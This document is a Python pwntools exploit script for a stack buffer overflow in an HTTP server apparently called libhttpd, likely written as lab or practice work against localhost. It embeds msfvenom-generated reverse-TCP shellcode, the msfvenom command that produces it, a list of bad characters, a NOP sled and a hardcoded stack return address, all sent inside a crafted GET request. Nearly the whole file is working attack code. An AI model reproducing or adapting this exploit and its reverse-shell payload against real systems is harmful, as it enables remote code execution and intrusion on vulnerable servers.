from pwn import (
    remote,
    p32,
    info, success
    )

"""
    @@ badChars:
               0x00(null \0), 0x20(space), 0x0a(\n), 0x0d(\r), 0x2f(/) ,0x3f(?)
    @@ padding:
              (GET ) + "0x90"*1048 + address($EIP)
    @@ msfvenom:
             msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f py -b "\x00\x20\x0a\x0d\x2f\x3f" -v sc
"""

# Shellcode
sc =  b""
sc += b"\xdb\xdc\xd9\x74\x24\xf4\xbb\xe8\x2b\xa2\x46\x5f"
sc += b"\x2b\xc9\xb1\x1f\x31\x5f\x1a\x03\x5f\x1a\x83\xef"
sc += b"\xfc\xe2\x1d\x41\xa8\x18\xec\x4d\x5b\x47\x5d\x31"
sc += b"\xf7\xe2\x63\x05\x91\x7b\x82\xa8\xde\xeb\x1f\x5b"
sc += b"\xa0\x13\x9f\x9a\x36\x16\x9f\xbf\xef\x9f\x7e\xd5"
sc += b"\x89\xc7\xd0\x7b\x01\x71\x31\x38\x60\x01\x34\x7f"
sc += b"\x03\x1b\x78\xf4\xc9\x73\x26\xf4\x31\x84\x7e\x9f"
sc += b"\x31\xee\x7b\xd6\xd1\xdf\x4a\x25\x95\xa5\x8c\xcf"
sc += b"\x2b\x4e\x2b\x82\x53\x28\x33\xf2\x5b\x4a\xba\x11"
sc += b"\x9a\xa1\xb0\x14\xfe\x3a\x78\xeb\xcc\xc3\xfd\xd4"
sc += b"\xb7\xd3\xa6\x5d\xa6\x4d\xea\x7a\x99\x6d\xc7\x03"
sc += b"\x5c\xb1\xaf\x01\xa0\xd3\xf7\x07\x5e\x14\x07\xb3"
sc += b"\x5f\x14\x07\xc3\x92\x94"

'''
Found 4 results, display max 4 items:
    libhttpd : 0x804f68a --> 0x74d9dcdb
        [heap]  : 0x8053942 --> 0x74d9dcdb
        [heap]  : 0x8055c5c --> 0x74d9dcdb
        [stack] : 0xffffcf4a --> 0x74d9dcdb
'''
shellAddr = p32(0xffffcf4a)

def main(host: str, port: int):
    
    PAYLOAD = b"\x90"*(1020-len(sc))
    PAYLOAD += sc
    PAYLOAD += b"\x90"*28
    
    c = remote(host, port)
    c.sendline(b"GET " + PAYLOAD + shellAddr)
    
    info("Payload length: {}".format(len(PAYLOAD)))
    success("Payload has been send successful.")


if __name__ == "__main__":
    main("127.0.0.1", 8081)
